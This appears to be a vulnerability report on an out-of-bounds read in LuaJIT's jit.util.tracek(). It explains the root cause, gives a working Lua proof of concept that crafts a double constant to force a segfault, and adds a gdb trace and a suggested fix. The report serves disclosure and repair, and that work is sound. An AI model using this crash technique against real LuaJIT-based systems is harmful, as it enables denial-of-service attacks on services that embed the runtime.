# Out-of-bounds read / crash in `jit.util.tracek()` on 64-bit trace constants

## Summary

`jit.util.tracek(tr, idx)` walks a compiled trace's constant table.
It only checks that `idx` falls *inside* the constant section — it
never checks whether that slot is the head of a real constant or the
raw second machine word of a 64-bit constant (`KNUM`/`KINT64`, which
take **two** IR slots). Reading that second word as an `IRIns`
reinterprets the constant's own bits as an opcode/operand. If the
misread opcode byte happens to equal `IR_KSLOT`, the function does
`ir = &T->ir[ir->op1]` with `op1` coming straight from the
constant's garbage bits — an out-of-bounds dereference, reachable
from plain Lua (`require("jit.util")`, no special privileges).

**Confirmed as a deterministic SIGSEGV on current upstream HEAD**
(`github.com/LuaJIT/LuaJIT`, v2.1 branch, commit
`3c4f9fe2052b8d08a917ac0d5f38563f0297b5a3`, 2026-07-11), plus a
distro system build and an older 2017-era build — same code, same
mechanism, all three.

## Root cause

64-bit constants are stored as two adjacent slots: the `IRIns` head
at the lower ref, and the raw `TValue` payload at `head_ref + 1`
(`lj_ir_k64`, `lj_ir.c`):

```c
ir[1].tv.u64 = u64;   /* payload sits one slot above the head */
```

The assembler backend knows to skip this second slot when walking
constants (`lj_asm.c:2118`, `if (irt_is64(ir->t) ...) ir++;`), but
`jit_util_tracek` (`lib_jit.c`) does not:

```c
IRIns *ir = &T->ir[ref];        /* may be a payload half, not a head */
if (ir->o == IR_KSLOT) {        /* garbage byte compared as an opcode */
  slot = ir->op2;
  ir = &T->ir[ir->op1];         /* OOB dereference, op1 is garbage */
}
```

`IR_KSLOT` is opcode 30. Any double whose byte 5 equals `0x1E` is
misread as `IR_KSLOT` when its payload half is queried; bytes 0-1 of
that same double become the out-of-bounds index.

## Proof of concept (crashes reliably)

```lua
local ffi   = require("ffi")
local jutil = require("jit.util")
jit.opt.start("hotloop=2")

-- Byte 5 = 0x1E (IR_KSLOT), bytes 0-1 = 0x6000 (the OOB index).
local u = ffi.new("union { double d; uint64_t i; }")
u.i = 0x42001E0000006000ULL
local POISON = u.d

local function work(x)
  local s = 0.0
  for i = 1, 200 do s = s + x * POISON end   -- interns POISON as a KNUM
  return s
end
work(1.5); work(2.5)

for tr = 1, 500 do
  local info = jutil.traceinfo(tr)
  if info then
    for idx = -1, -info.nk, -1 do
      jutil.tracek(tr, idx)   -- crashes here
    end
  end
end
print("completed without crashing")
```

```
$ luajit repro.lua
Segmentation fault (core dumped)
```

gdb backtrace (debug build of current upstream HEAD):

```
Program received signal SIGSEGV, Segmentation fault.
lj_cf_jit_util_tracek (L=0x7ffff7f9b380) at lib_jit.c:331
331	    if (ir->o == IR_KINT64) ctype_loadffi(L);
        ir = 0x7ffff7f9a960   <- &T->ir[24576], the crafted op1, unmapped
```

Reproduced 5/5 runs on the distro system build and 5/5 on a fresh
clone of `LuaJIT/LuaJIT` v2.1 HEAD; also crashes the older 2017-era
build. (`0xFFFF` as the offset, the theoretical max, happens to stay
inside LuaJIT's own allocator's mmap'd arena on the two newer/larger
builds; `0x6000` reliably escapes it on all three.)

## Suggested fix

`jit_util_tracek` needs to reject payload-half refs, or the walk
needs to track heads vs. payload halves the way `lj_asm.c:2118`
already does — e.g. reject any `idx` whose predecessor ref
(`ref + 1`, since the section grows downward) is a 64-bit constant
head.

## Environment

- `github.com/LuaJIT/LuaJIT`, v2.1 branch, commit
  `3c4f9fe2052b8d08a917ac0d5f38563f0297b5a3` (2026-07-11, current
  upstream HEAD) — GC64, x86-64 Linux.
- Also reproduced on a distro-packaged `luajit` (`2.1.1703358377`,
  GC64) and an older pinned `tarantool/luajit` build (2017-era
  `2.1.0-beta3`, non-GC64). `jit_util_tracek` is byte-identical
  across all three.
